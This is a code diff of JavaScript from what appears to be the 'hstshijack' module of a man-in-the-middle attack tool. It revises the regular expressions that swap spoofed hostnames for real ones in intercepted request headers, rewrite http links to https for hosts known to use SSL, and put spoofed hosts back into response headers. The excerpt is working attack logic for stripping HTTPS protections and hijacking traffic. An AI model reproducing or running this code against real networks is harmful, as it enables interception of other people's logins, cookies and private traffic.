@@ -321,12 +321,12 @@ function onRequest(req, res) {
 			// Patch spoofed hostnames.
 			for (var a = 0; a < target_hosts.length; a++) {
 				// Patch spoofed hostnames in headers.
-				regexp = new RegExp( "(.*?)" + replacement_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "([^\.a-z]*)", "igm" )
+				regexp = new RegExp( replacement_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "([^\.a-z]*)", "igm" )
 				if ( req.Headers.match(regexp) ) {
 					matches = req.Headers.match(regexp)
 					for (var b = 0; b < matches.length; b++) {
 						original_host = target_hosts[a].replace("*", "")
-						replacement   = matches[b].replace(regexp, "$1" + original_host + "$2")
+						replacement   = matches[b].replace(regexp, original_host + "$1")
 						req.Headers   = req.Headers.replace(matches[b], replacement)
 					}
 					log_debug("(" + green + "hstshijack" + reset + ") Patched spoofed hostname(s) in request header(s).")
@@ -346,11 +346,11 @@ function onRequest(req, res) {
 
 			// Patch SSL in headers if we know host uses SSL.
 			for (var a = 0; a < ssl_log.length; a++) {
-				regexp = new RegExp( "(.*?)http:\/\/" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "([^\.a-z]*)", "igm" )
+				regexp = new RegExp( "http:\/\/" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-") + "([^\.a-z]*)", "igm" )
 				if ( req.Headers.match(regexp) ) {
 					matches = req.Headers.match(regexp)
 					for (var b = 0; b < matches.length; b++) {
-						replacement = matches[b].replace(regexp, "$1" + "https://" + ssl_log[a] + "$2")
+						replacement = matches[b].replace(regexp, "https://" + ssl_log[a] + "$1")
 						req.Headers = req.Headers.replace(matches[b], replacement)
 						log_debug("(" + green + "hstshijack" + reset + ") Patched SSL in header(s) for " + ssl_log[a] + ".")
 					}
@@ -533,12 +533,12 @@ function onResponse(req, res) {
 
 		// Replace hosts in headers.
 		for (var a = 0; a < target_hosts.length; a++) {
-			regexp  = new RegExp( "(.*?)" + target_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "([^\.a-z]*)", "igm" )
+			regexp  = new RegExp( target_hosts[a].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "") + "([^\.a-z]*)", "igm" )
 			if ( res.Headers.match(regexp) ) {
 				matches = res.Headers.match(regexp)
 				for (var b = 0; b < matches.length; b++) {
 					original_host = replacement_hosts[a].replace("*", "")
-					replacement   = matches[b].replace(regexp, "$1" + original_host + "$2")
+					replacement   = matches[b].replace(regexp, original_host + "$1")
 					res.Headers   = res.Headers.replace(matches[b], replacement)
 					log_debug("(" + green + "hstshijack" + reset + ") Replaced " + bold + target_hosts[a] + reset + " with " + bold + replacement_hosts[a] + reset + " in header(s).")
 				}
